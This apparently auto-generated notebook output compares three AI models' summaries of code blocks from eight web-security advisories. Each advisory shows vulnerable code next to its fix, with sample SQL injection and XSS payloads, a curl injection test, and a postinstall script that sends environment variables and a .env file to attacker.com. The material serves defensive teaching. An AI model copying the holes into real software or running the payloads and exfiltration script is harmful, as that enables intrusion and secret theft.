---
generated by: notebooks/advisories.ipynb
---

#### advisory-001.md - 5 code blocks

##### 1 - javascript

```javascript
const { body, validationResult } = require('express-validator');
const express = require('express');
const app = express();

app.post('/register', 
  body('email').isEmail(),
  body('username').isLength({ min: 3 }),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      // VULNERABLE: User input directly inserted into HTML
      return res.status(400).send(`
        <h1>Validation Error</h1>
        <p>${errors.array()[0].msg}</p>
        <p>Input: ${req.body.username}</p>
      `);
    }
    // ... registration logic
  }
);
```

- ollama:llama3.2
  > The provided Express.js code defines a POST endpoint for user registration, validating user input and displaying validation errors in an HTML response.

- anthropic:claude-opus-4-5
  > This Express.js registration endpoint validates email and username inputs but contains a reflected XSS vulnerability by directly embedding unsanitized user input (username) into the HTML error response.

- openai:gpt-5.2
  > This Express `/register` POST route validates email and username length with express-validator, then on validation failure returns an HTML error response that unsafely interpolates user input (`req.body.username`) and the validation message, creating an XSS risk.

##### 2 - language not specified

```
username=<script>alert(document.cookie)</script>
```

- ollama:llama3.2
  > The given code injects malicious JavaScript code that attempts to access and display the user's cookies.

- anthropic:claude-opus-4-5
  > This code demonstrates a Cross-Site Scripting (XSS) attack attempt where a malicious JavaScript payload is injected into a username parameter to steal and display the user's cookies.

- openai:gpt-5.2
  > The code assigns a username value containing an embedded JavaScript alert script that would attempt to display the browser’s cookies, characteristic of an XSS payload.

##### 3 - bash

```bash
npm install express-validator@latest
```

- ollama:llama3.2
  > This command installs the latest version of Express Validator as a dependency for an npm project using Node.js.

- anthropic:claude-opus-4-5
  > This command installs the latest version of the express-validator package from npm into a Node.js project.

- openai:gpt-5.2
  > Installs the latest version of the `express-validator` package using npm.

##### 4 - bash

```bash
npm list express-validator
```

- ollama:llama3.2
  > The command `npm list express-validator` lists all packages that are installed under the name "express-validator" and their respective versions.

- anthropic:claude-opus-4-5
  > This command displays the installed version and dependency tree of the express-validator package in the current Node.js project.

- openai:gpt-5.2
  > The command lists the installed version and dependency tree information for the `express-validator` package in the current npm project.

##### 5 - javascript

```javascript
const { body, validationResult } = require('express-validator');
const express = require('express');
const app = express();

// Helper function to escape HTML
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

app.post('/register', 
  body('email').isEmail(),
  body('username').isLength({ min: 3 }),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      // FIXED: Properly escape user input
      const errorMsg = escapeHtml(errors.array()[0].msg);
      const username = escapeHtml(req.body.username);
      return res.status(400).send(`
        <h1>Validation Error</h1>
        <p>${errorMsg}</p>
        <p>Input: ${username}</p>
      `);
    }
    // ... registration logic
  }
);
```

- ollama:llama3.2
  > This Express.js application validates user input for a POST `/register` endpoint using middleware from the `express-validator` library.

- anthropic:claude-opus-4-5
  > This Express.js code defines a user registration endpoint that validates email and username inputs, and safely renders validation errors in HTML by escaping user-provided data to prevent XSS attacks.

- openai:gpt-5.2
  > This Express `/register` POST route uses `express-validator` to validate email and username length, and on validation failure escapes the error message and username before returning a 400 HTML response to prevent XSS.

#### advisory-002.md - 7 code blocks

##### 1 - javascript

```javascript
const db = require('./database');
const crypto = require('crypto');

class AuthService {
  async authenticateUser(username, password) {
    // VULNERABLE: Direct string concatenation in SQL query
    const query = `
      SELECT id, username, email, password_hash 
      FROM users 
      WHERE username = '${username}' 
      AND active = 1
    `;
    
    const result = await db.query(query);
    
    if (result.rows.length === 0) {
      throw new Error('Invalid credentials');
    }
    
    const user = result.rows[0];
    const passwordHash = crypto.createHash('sha256')
      .update(password + user.salt)
      .digest('hex');
    
    if (passwordHash !== user.password_hash) {
      throw new Error('Invalid credentials');
    }
    
    return user;
  }
}
```

- ollama:llama3.2
  > The provided code defines an `AuthService` class that handles user authentication through SQL querying and hashing to verify passwords, however it contains a vulnerability due to direct string concatenation in the SQL query.

- anthropic:claude-opus-4-5
  > This code defines an authentication service that verifies user credentials by querying a database and comparing password hashes, but contains a critical SQL injection vulnerability due to direct string concatenation of the username into the query.

- openai:gpt-5.2
  > The code defines an AuthService method that queries the database for an active user by username using a SQL-injection-prone concatenated query, hashes the provided password with the user’s salt via SHA-256, and returns the user if the hash matches or throws an error otherwise.

##### 2 - language not specified

```
Username: admin' OR '1'='1' --
Password: anything
```

- ollama:llama3.2
  > This is a SQL injection attempt where the username 'admin' or any other value is combined with a malicious query that will always return true, potentially allowing unauthorized access to the system.

- anthropic:claude-opus-4-5
  > This demonstrates an SQL injection attack where a malicious username input attempts to bypass authentication by injecting a condition that always evaluates to true and commenting out the rest of the query.

- openai:gpt-5.2
  > The code is an SQL injection attempt that uses a tautology in the username field to bypass authentication regardless of the password.

##### 3 - language not specified

```
Username: admin' UNION SELECT id, username, email, password_hash FROM users WHERE '1'='1
```

- ollama:llama3.2
  > This SQL statement attempts to retrieve sensitive user data by leveraging a common web application vulnerability known as a SQL injection attack.

- anthropic:claude-opus-4-5
  > This is a SQL injection attack payload that attempts to exploit a login form by terminating the intended query and appending a UNION SELECT statement to extract user credentials from the database.

- openai:gpt-5.2
  > The snippet is an SQL injection payload that attempts to bypass authentication and union-select user IDs, usernames, emails, and password hashes from the `users` table.

##### 4 - language not specified

```
Username: admin' UNION SELECT null, null, null, table_name FROM information_schema.tables --
```

- ollama:llama3.2
  > The provided SQL query attempts to retrieve all table names from the information schema tables using a union of NULL values and table names.

- anthropic:claude-opus-4-5
  > This is a SQL injection attack payload that attempts to bypass authentication and extract database table names from the information_schema by injecting a UNION SELECT statement into a username field.

- openai:gpt-5.2
  > The input is a SQL injection payload that attempts to union-query the database’s information schema to list table names by bypassing the username field and commenting out the rest of the original query.

##### 5 - bash

```bash
npm install webapp-auth@latest
```

- ollama:llama3.2
  > The command installs the latest version of the 'webapp-auth' package using npm.

- anthropic:claude-opus-4-5
  > This command installs the latest version of the "webapp-auth" package from the npm registry.

- openai:gpt-5.2
  > Installs the latest version of the `webapp-auth` package using npm.

##### 6 - javascript

```javascript
const db = require('./database');
const crypto = require('crypto');

class AuthService {
  async authenticateUser(username, password) {
    // FIXED: Use parameterized queries
    const query = `
      SELECT id, username, email, password_hash, salt
      FROM users 
      WHERE username = $1 
      AND active = 1
    `;
    
    // Input validation
    if (!username || typeof username !== 'string' || username.length > 100) {
      throw new Error('Invalid username format');
    }
    
    const result = await db.query(query, [username]);
    
    if (result.rows.length === 0) {
      // Use generic error message to prevent user enumeration
      throw new Error('Invalid credentials');
    }
    
    const user = result.rows[0];
    const passwordHash = crypto.createHash('sha256')
      .update(password + user.salt)
      .digest('hex');
    
    if (passwordHash !== user.password_hash) {
      throw new Error('Invalid credentials');
    }
    
    return user;
  }
}
```

- ollama:llama3.2
  > This code defines an `AuthService` class that authenticates users by comparing the provided username and password with stored data from a database, using parameterized queries to prevent SQL injection.

- anthropic:claude-opus-4-5
  > This code defines an authentication service that validates a username, queries a database for the user using parameterized queries, verifies the password by comparing salted SHA-256 hashes, and returns the user object if credentials are valid.

- openai:gpt-5.2
  > This code defines an authentication service that validates a username, queries the active user record with a parameterized SQL statement, hashes the provided password with the stored salt using SHA-256, and returns the user if the hash matches or throws a generic invalid-credentials error otherwise.

##### 7 - bash

```bash
# Test authentication endpoint
curl -X POST https://example.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "test"}'
```

- ollama:llama3.2
  > This code uses `curl` to send a maliciously crafted JSON payload to the login endpoint of an API, attempting to inject SQL injection-like vulnerabilities by exploiting double quotes and concatenation in the username.

- anthropic:claude-opus-4-5
  > This code uses curl to test a login API endpoint with a SQL injection attack payload in the username field.

- openai:gpt-5.2
  > This curl command sends a JSON login request to an authentication endpoint using a SQL injection-style username payload to test for authentication bypass vulnerabilities.

#### advisory-003.md - 9 code blocks

##### 1 - json

```json
{
  "name": "my-application",
  "version": "1.0.0",
  "dependencies": {
    "secure-config": "^3.1.0"
  },
  "scripts": {
    "install": "npm install"
  }
}
```

- ollama:llama3.2
  > This is a JSON-formatted file representing the `package.json` of a Node.js application, defining its metadata and dependencies for installation.

- anthropic:claude-opus-4-5
  > This is a package.json file that defines a Node.js application named "my-application" at version 1.0.0 with a dependency on the "secure-config" package and an install script.

- openai:gpt-5.2
  > This package.json defines a Node.js application named "my-application" version 1.0.0 that depends on "secure-config" and includes an install script that runs `npm install`.

##### 2 - javascript

```javascript
// Malicious postinstall script
const https = require('https');
const fs = require('fs');

// Exfiltrate environment variables and secrets
const data = JSON.stringify({
  env: process.env,
  secrets: fs.readFileSync('/app/.env', 'utf8')
});

const options = {
  hostname: 'attacker.com',
  path: '/exfiltrate',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options);
req.write(data);
req.end();
```

- ollama:llama3.2
  > A malicious Node.js script uses the `https` module to send sensitive environment variables and secret keys from an `.env` file to an attacker-controlled server via a POST request.

- anthropic:claude-opus-4-5
  > This malicious Node.js postinstall script steals environment variables and secrets from a .env file and sends them to an attacker's server.

- openai:gpt-5.2
  > This Node.js postinstall script reads environment variables and a local `.env` file and sends them via an HTTPS POST request to `attacker.com/exfiltrate` for exfiltration.

##### 3 - bash

```bash
npm install secure-config@latest
```

- ollama:llama3.2
  > The command installs the latest version of the secure-config package from npm.

- anthropic:claude-opus-4-5
  > This command installs the latest version of the secure-config package from npm.

- openai:gpt-5.2
  > Installs the latest version of the `secure-config` npm package into the current project.

##### 4 - json

```json
{
  "dependencies": {
    "@your-org/secure-config": "^3.2.0"
  }
}
```

- ollama:llama3.2
  > This is a dependencies file for a project, specifying that it depends on the `@your-org/secure-config` package version 3.2.0.

- anthropic:claude-opus-4-5
  > This JSON snippet defines a project dependency on the "@your-org/secure-config" package at version 3.2.0 or compatible higher versions.

- openai:gpt-5.2
  > This JSON dependency configuration adds the `@your-org/secure-config` package at version `^3.2.0`.

##### 5 - bash

```bash
npm ci  # Uses package-lock.json, fails if checksums don't match
```

- ollama:llama3.2
  > The command `npm ci` uses the package-lock.json file to install dependencies and fails if the checksums do not match.

- anthropic:claude-opus-4-5
  > The command `npm ci` performs a clean install of dependencies using the exact versions specified in package-lock.json, failing if the checksums don't match to ensure reproducible builds.

- openai:gpt-5.2
  > Runs `npm ci` to install dependencies strictly from `package-lock.json`, failing if the lockfile checksums don’t match.

##### 6 - json

```json
{
  "name": "my-application",
  "version": "1.0.0",
  "dependencies": {
    "@your-org/secure-config": "^3.2.0"
  },
  "scripts": {
    "install": "npm ci --prefer-offline"
  }
}
```

- ollama:llama3.2
  > This is a JavaScript package.json file containing metadata and dependencies for the application, including a specified version number and a dependency on "@your-org/secure-config" version 3.2.0.

- anthropic:claude-opus-4-5
  > This is a package.json file defining a Node.js application named "my-application" at version 1.0.0 with one dependency and a custom install script that runs npm ci with offline preference.

- openai:gpt-5.2
  > This package.json defines a Node.js application named "my-application" version 1.0.0 that depends on @your-org/secure-config and uses an install script running `npm ci --prefer-offline`.

##### 7 - ini

```ini
# .npmrc
@your-org:registry=https://npm.your-org.com/
//npm.your-org.com/:_authToken=${NPM_TOKEN}
```

- ollama:llama3.2
  > This `.npmrc` file configures NPM to use a custom registry and authentication for the specified organization.

- anthropic:claude-opus-4-5
  > This `.npmrc` configuration file sets up npm to use a private registry for packages under the `@your-org` scope and authenticates to that registry using an environment variable for the auth token.

- openai:gpt-5.2
  > This `.npmrc` config routes `@your-org` packages to `https://npm.your-org.com/` and authenticates to that registry using the `NPM_TOKEN` environment variable.

##### 8 - bash

```bash
# Verify package integrity
npm audit
npm audit --production
```

- ollama:llama3.2
  > The provided npm commands run a security audit to verify the integrity of packages installed in a project and, optionally, in production mode.

- anthropic:claude-opus-4-5
  > These commands check for security vulnerabilities in npm package dependencies, with the second command focusing only on production dependencies.

- openai:gpt-5.2
  > The code runs npm audit twice to check for dependency vulnerabilities in all packages and then only production dependencies.

##### 9 - yaml

```yaml
# .github/workflows/security.yml
- name: Verify package integrity
  run: |
    npm ci
    npm audit --audit-level=moderate
    npm run verify-packages
```

- ollama:llama3.2
  > This workflow script uses three NPM commands to ensure the security of a Node.js project by running integrity verification, auditing for moderate vulnerabilities, and verifying packages.

- anthropic:claude-opus-4-5
  > This GitHub Actions workflow step installs npm dependencies with a clean install, checks for security vulnerabilities at moderate severity or higher, and runs a custom package verification script.

- openai:gpt-5.2
  > This GitHub Actions step installs npm dependencies, runs a moderate-level security audit, and executes a package verification script to ensure package integrity.

#### advisory-004.md - 3 code blocks

##### 1 - javascript

```javascript
const fs = require('fs');
const path = require('path');

class DataProcessor {
  constructor(baseDir) {
    this.baseDir = baseDir;
  }

  async readFile(userPath) {
    // VULNERABLE: Direct path concatenation without validation
    const filePath = path.join(this.baseDir, userPath);
    const content = await fs.promises.readFile(filePath, 'utf8');
    return content;
  }
}

// Usage in API endpoint
app.get('/api/files/:filename', async (req, res) => {
  const processor = new DataProcessor('/app/uploads');
  const content = await processor.readFile(req.params.filename);
  res.send(content);
});
```

- ollama:llama3.2
  > The provided code defines a class `DataProcessor` that reads files from a specified base directory and returns their contents, used in an API endpoint to serve file contents.

- anthropic:claude-opus-4-5
  > This code contains a path traversal vulnerability where user-supplied filenames are joined to a base directory without validation, allowing attackers to read arbitrary files outside the intended uploads folder using sequences like "../".

- openai:gpt-5.2
  > The code defines a DataProcessor that reads and returns the contents of a file in a base uploads directory via an API endpoint using a user-supplied path joined without validation, making it vulnerable to path traversal.

##### 2 - bash

```bash
npm install data-processor@latest
```

- ollama:llama3.2
  > The command installs the latest version of the 'data-processor' package using npm.

- anthropic:claude-opus-4-5
  > This command installs the latest version of the "data-processor" package from the npm registry.

- openai:gpt-5.2
  > This command installs the latest version of the `data-processor` npm package.

##### 3 - javascript

```javascript
class DataProcessor {
  constructor(baseDir) {
    this.baseDir = path.resolve(baseDir);
  }

  validatePath(userPath) {
    const normalizedPath = path.normalize(userPath);
    
    // Prevent directory traversal
    if (normalizedPath.includes('..')) {
      throw new Error('Invalid path: directory traversal detected');
    }
    
    const resolvedPath = path.resolve(this.baseDir, normalizedPath);
    
    // Ensure path is within base directory
    if (!resolvedPath.startsWith(this.baseDir)) {
      throw new Error('Invalid path: outside base directory');
    }
    
    return resolvedPath;
  }

  async readFile(userPath) {
    const filePath = this.validatePath(userPath);
    const stats = await fs.promises.stat(filePath);
    
    if (!stats.isFile()) {
      throw new Error('Path is not a file');
    }
    
    return await fs.promises.readFile(filePath, 'utf8');
  }
}
```

- ollama:llama3.2
  > This code defines a `DataProcessor` class that provides methods to validate and read files from user-provided paths while ensuring they are within the specified base directory.

- anthropic:claude-opus-4-5
  > This code defines a DataProcessor class that safely reads files from a specified base directory while preventing directory traversal attacks by validating and constraining user-provided paths.

- openai:gpt-5.2
  > This `DataProcessor` class resolves a base directory, validates user-supplied paths to prevent directory traversal and enforce containment within the base directory, and asynchronously reads and returns the contents of a verified file.

#### advisory-005.md - 3 code blocks

##### 1 - javascript

```javascript
const fs = require('fs');

class FileHandler {
  async processFile(filePath) {
    const content = await fs.promises.readFile(filePath, 'utf8');
    
    // VULNERABLE: Unsafe deserialization using eval
    try {
      const data = eval(`(${content})`);
      return this.processData(data);
    } catch (error) {
      throw new Error('Invalid file format');
    }
  }

  async processSerializedData(serializedData) {
    // VULNERABLE: Using Function constructor (similar to eval)
    const deserializer = new Function('return ' + serializedData);
    const data = deserializer();
    return this.handleData(data);
  }
}
```

- ollama:llama3.2
  > The provided code defines a FileHandler class that processes files using JavaScript's eval function, which is highly insecure and vulnerable to code injection attacks.

- anthropic:claude-opus-4-5
  > This code defines a FileHandler class with two methods that unsafely deserialize data using eval and the Function constructor, creating serious security vulnerabilities that could allow arbitrary code execution.

- openai:gpt-5.2
  > The code defines a Node.js `FileHandler` that reads and deserializes file or string content using `eval` and the `Function` constructor (unsafe), then passes the resulting data to processing methods while throwing an error on invalid formats.

##### 2 - bash

```bash
npm install file-handler@latest
```

- ollama:llama3.2
  > This command installs the latest version of the "file-handler" package using npm (Node Package Manager).

- anthropic:claude-opus-4-5
  > This command installs the latest version of the "file-handler" package from the npm registry.

- openai:gpt-5.2
  > Runs npm to install or update the `file-handler` package to the latest version in the current project.

##### 3 - javascript

```javascript
class FileHandler {
  async processFile(filePath) {
    const content = await fs.promises.readFile(filePath, 'utf8');
    
    // Validate file size
    if (content.length > 10 * 1024 * 1024) {
      throw new Error('File too large');
    }
    
    // FIXED: Use safe JSON.parse instead of eval
    try {
      const data = JSON.parse(content);
      
      // Validate data structure
      if (!this.validateDataStructure(data)) {
        throw new Error('Invalid data structure');
      }
      
      return this.processData(data);
    } catch (error) {
      if (error instanceof SyntaxError) {
        throw new Error('Invalid JSON format');
      }
      throw error;
    }
  }

  validateDataStructure(data) {
    if (typeof data !== 'object' || data === null) {
      return false;
    }
    
    // Check for dangerous properties
    const dangerousProps = ['__proto__', 'constructor', 'prototype'];
    for (const prop of dangerousProps) {
      if (data.hasOwnProperty(prop)) {
        return false;
      }
    }
    
    return true;
  }
}
```

- ollama:llama3.2
  > This code defines a `FileHandler` class that asynchronously processes files by validating their content and structure using JSON parsing and specific validation checks.

- anthropic:claude-opus-4-5
  > This FileHandler class asynchronously reads a file, validates its size and JSON structure (including protection against prototype pollution attacks), and processes the parsed data while handling errors appropriately.

- openai:gpt-5.2
  > The `FileHandler` asynchronously reads a file, rejects overly large content, safely parses it as JSON, validates the resulting object against invalid structure and prototype-pollution properties, and then processes the validated data while translating JSON syntax errors into a clear message.

#### advisory-006.md - 3 code blocks

##### 1 - python

```python
from flask import Flask, request, session, jsonify
from api_client import APIClient

app = Flask(__name__)
app.secret_key = 'your-secret-key'

@app.route('/api/user/email', methods=['POST'])
def update_email():
    # VULNERABLE: No CSRF token validation
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    new_email = request.json.get('email')
    client = APIClient()
    result = client.update_user_email(session['user_id'], new_email)
    return jsonify({'success': True, 'email': new_email})
```

- ollama:llama3.2
  > This Flask API endpoint allows users to update their email addresses without CSRF token validation, potentially exposing the application to cross-site request forgery attacks.

- anthropic:claude-opus-4-5
  > This Flask endpoint updates a user's email address but is vulnerable to CSRF attacks because it lacks token validation despite requiring session authentication.

- openai:gpt-5.2
  > A Flask app defines a POST endpoint that updates the logged-in user’s email via an API client using the session user_id but lacks CSRF protection and returns a JSON success response.

##### 2 - bash

```bash
pip install --upgrade api-client
```

- ollama:llama3.2
  > This command upgrades the "api-client" package to its latest version using pip.

- anthropic:claude-opus-4-5
  > This command installs or upgrades the Python package "api-client" using pip, the Python package manager.

- openai:gpt-5.2
  > Upgrades the `api-client` Python package to the latest version using pip.

##### 3 - python

```python
from flask import Flask, request, session, jsonify
from flask_wtf.csrf import CSRFProtect
from api_client import APIClient
import secrets

app = Flask(__name__)
app.secret_key = 'your-secret-key'
csrf = CSRFProtect(app)

def generate_csrf_token():
    """Generate CSRF token for session"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token():
    """Validate CSRF token from request"""
    token = request.headers.get('X-CSRF-Token') or request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        return False
    return True

@app.route('/api/user/email', methods=['POST'])
def update_email():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    # FIXED: Validate CSRF token
    if not validate_csrf_token():
        return jsonify({'error': 'Invalid CSRF token'}), 403
    
    new_email = request.json.get('email')
    if not is_valid_email(new_email):
        return jsonify({'error': 'Invalid email format'}), 400
    
    client = APIClient()
    result = client.update_user_email(session['user_id'], new_email)
    return jsonify({'success': True, 'email': new_email})
```

- ollama:llama3.2
  > This Flask application validates CSRF tokens for API requests, particularly when updating a user's email address.

- anthropic:claude-opus-4-5
  > This Flask application implements a CSRF-protected API endpoint that allows authenticated users to update their email address after validating their session, CSRF token, and email format.

- openai:gpt-5.2
  > This Flask app secures a POST endpoint for updating the logged-in user’s email by generating and validating a session-based CSRF token, checking authorization and email format, then calling an API client to perform the update and returning a JSON response.

#### advisory-007.md - 3 code blocks

##### 1 - python

```python
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/api/fetch', methods=['POST'])
def fetch_url():
    # VULNERABLE: No URL validation
    url = request.json.get('url')
    
    if not url:
        return jsonify({'error': 'URL required'}), 400
    
    # VULNERABLE: Direct request without validation
    try:
        response = requests.get(url, timeout=10)
        return jsonify({
            'status_code': response.status_code,
            'content': response.text[:1000]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

- ollama:llama3.2
  > This Flask API endpoint attempts to fetch the content of a provided URL and returns it in JSON format, but lacks essential URL validation and error handling.

- anthropic:claude-opus-4-5
  > This Flask API endpoint is vulnerable to Server-Side Request Forgery (SSRF) as it fetches any user-provided URL without validation, potentially allowing attackers to access internal resources.

- openai:gpt-5.2
  > This Flask app exposes a POST `/api/fetch` endpoint that accepts a JSON `url`, fetches it via `requests.get` without validation (making it SSRF-prone), and returns the response status code and up to 1000 characters of content or an error.

##### 2 - bash

```bash
pip install --upgrade http-server
```

- ollama:llama3.2
  > This command upgrades the HTTP server package to its latest version using pip.

- anthropic:claude-opus-4-5
  > This command installs or upgrades the http-server package using pip, Python's package manager.

- openai:gpt-5.2
  > Upgrades (or installs) the `http-server` package to the latest version using pip.

##### 3 - python

```python
from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def is_internal_ip(ip):
    """Check if IP is internal/private"""
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local
    except ValueError:
        return False

def validate_url(url):
    """Validate URL to prevent SSRF"""
    if not url:
        return False, "URL is required"
    
    parsed = urlparse(url)
    
    # Only allow HTTP and HTTPS
    if parsed.scheme not in ['http', 'https']:
        return False, "Only HTTP and HTTPS protocols are allowed"
    
    hostname = parsed.hostname
    if not hostname:
        return False, "Invalid hostname"
    
    # Resolve and check IPs
    ips = socket.gethostbyname_ex(hostname)[2]
    for ip in ips:
        if is_internal_ip(ip):
            return False, "Internal IP addresses are not allowed"
    
    # Block cloud metadata endpoints
    blocked_hosts = ['169.254.169.254', 'metadata.google.internal']
    if hostname in blocked_hosts or any(ip in blocked_hosts for ip in ips):
        return False, "Cloud metadata endpoints are blocked"
    
    return True, None

@app.route('/api/fetch', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    is_valid, error_msg = validate_url(url)
    
    if not is_valid:
        return jsonify({'error': error_msg}), 400
    
    try:
        response = requests.get(url, timeout=10, allow_redirects=False)
        return jsonify({
            'status_code': response.status_code,
            'content': response.text[:1000]
        })
    except Exception as e:
        return jsonify({'error': 'Request failed'}), 500
```

- ollama:llama3.2
  > This code validates incoming URLs to prevent Server-Side Request Forgery (SSRF) attacks by checking for internal IPs and cloud metadata endpoints, and returns an error response if the URL is invalid.

- anthropic:claude-opus-4-5
  > This code implements a Flask API endpoint that fetches external URLs while protecting against Server-Side Request Forgery (SSRF) attacks by validating URL schemes, blocking internal/private IP addresses, and preventing access to cloud metadata endpoints.

- openai:gpt-5.2
  > The code defines a Flask endpoint that accepts a URL, validates it to mitigate SSRF by allowing only http/https and rejecting internal/private or cloud-metadata host IPs after DNS resolution, then fetches the URL without redirects and returns the status code and a truncated response body.

#### advisory-008.md - 3 code blocks

##### 1 - python

```python
import json
import yaml
from json_parser import JSONParser

class DataProcessor:
    def process_json_data(self, json_string):
        # VULNERABLE: Using eval for "enhanced" JSON parsing
        try:
            data = eval(f"json.loads({repr(json_string)})")
            return self.handle_data(data)
        except:
            data = json.loads(json_string)
            return self.handle_data(data)
    
    def process_config(self, config_string):
        # VULNERABLE: Using yaml.load instead of yaml.safe_load
        config = yaml.load(config_string, Loader=yaml.Loader)
        return self.apply_config(config)
    
    def process_pickled_data(self, pickled_data):
        # VULNERABLE: Unpickling user-controlled data
        data = pickle.loads(pickled_data)
        return self.process_data(data)
```

- ollama:llama3.2
  > This code defines a DataProcessor class that processes different types of data from JSON strings, YAML configurations, and pickled data, but contains vulnerabilities due to the use of insecure methods for parsing and unpickling.

- anthropic:claude-opus-4-5
  > This code contains a DataProcessor class with three methods that each contain serious security vulnerabilities: using eval() for JSON parsing, using unsafe yaml.load() instead of yaml.safe_load(), and deserializing untrusted pickle data—all of which can lead to arbitrary code execution.

- openai:gpt-5.2
  > The code defines a `DataProcessor` that parses JSON/config/pickled inputs but does so insecurely by using `eval`, unsafe `yaml.load`, and unpickling user-controlled data, enabling potential code execution vulnerabilities.

##### 2 - bash

```bash
pip install --upgrade json-parser
```

- ollama:llama3.2
  > The command upgrades the json-parser package to its latest version using pip.

- anthropic:claude-opus-4-5
  > This command installs or upgrades the json-parser package using pip, Python's package installer.

- openai:gpt-5.2
  > Upgrades the `json-parser` package to the latest available version using pip.

##### 3 - python

```python
import json
import yaml

class DataProcessor:
    def process_json_data(self, json_string):
        # FIXED: Use safe JSON parsing only
        try:
            if len(json_string) > 10 * 1024 * 1024:  # 10MB limit
                raise ValueError("Input too large")
            
            # FIXED: Use standard json.loads (safe)
            data = json.loads(json_string)
            
            # Validate data structure
            if not self.validate_data_structure(data):
                raise ValueError("Invalid data structure")
            
            return self.handle_data(data)
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON: {e}")
    
    def process_config(self, config_string):
        # FIXED: Use yaml.safe_load instead of yaml.load
        try:
            config = yaml.safe_load(config_string)
            
            if not isinstance(config, dict):
                raise ValueError("Config must be a dictionary")
            
            # Whitelist allowed configuration keys
            allowed_keys = ['timeout', 'retries', 'max_connections']
            filtered_config = {
                k: v for k, v in config.items() 
                if k in allowed_keys
            }
            
            return self.apply_config(filtered_config)
        except yaml.YAMLError as e:
            raise ValueError(f"Invalid YAML: {e}")
    
    def validate_data_structure(self, data):
        """Validate data structure to prevent object injection"""
        if not isinstance(data, (dict, list, str, int, float, bool, type(None))):
            return False
        
        # Check for dangerous keys
        dangerous_keys = ['__class__', '__init__', '__new__', '__reduce__']
        
        def check_dict(d):
            for key, value in d.items():
                if any(dk in str(key).lower() for dk in dangerous_keys):
                    return False
                if isinstance(value, dict):
                    if not check_dict(value):
                        return False
                elif isinstance(value, list):
                    if not check_list(value):
                        return False
            return True
        
        def check_list(l):
            for item in l:
                if isinstance(item, dict):
                    if not check_dict(item):
                        return False
                elif isinstance(item, list):
                    if not check_list(item):
                        return False
            return True
        
        if isinstance(data, dict):
            return check_dict(data)
        elif isinstance(data, list):
            return check_list(data)
        
        return True
```

- ollama:llama3.2
  > This code defines a `DataProcessor` class that provides methods to safely parse and validate JSON and YAML data, detecting potential security vulnerabilities such as object injection.

- anthropic:claude-opus-4-5
  > This code defines a DataProcessor class that safely parses JSON and YAML input with security measures including size limits, safe parsing methods, data structure validation to prevent object injection, and configuration key whitelisting.

- openai:gpt-5.2
  > The `DataProcessor` class safely parses JSON with size and structure validation to prevent injection and safely loads YAML configuration while whitelisting allowed keys before handing the sanitized data/config to downstream handlers.
